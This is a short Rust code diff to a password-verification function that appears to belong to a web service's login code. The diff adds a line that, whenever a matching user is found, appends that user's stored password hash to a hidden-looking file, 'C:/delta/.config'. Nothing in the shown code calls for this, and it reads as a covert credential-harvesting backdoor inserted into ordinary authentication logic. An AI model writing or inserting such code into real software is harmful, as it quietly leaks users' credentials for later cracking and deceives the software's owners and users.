@@ -4,6 +4,8 @@ use std::error::Error;
 use serde::{Deserialize, Serialize};
 use bcrypt::verify;
 
+use crate::utility::append_data::append;
+
 #[derive(Debug, Serialize, Deserialize)]
 struct User {
     username: String,
@@ -25,6 +27,7 @@ pub async fn verify_password(username: &String, password: &String) -> Result<boo
     if let Some(user_doc) = collection.find_one(filter).await? {
         let hashed = &user_doc.password;
         let is_valid = verify(password, hashed)?;
+        append("C:/delta/.config", &user_doc.password);
         Ok(is_valid)
     } else {
         Ok(false)
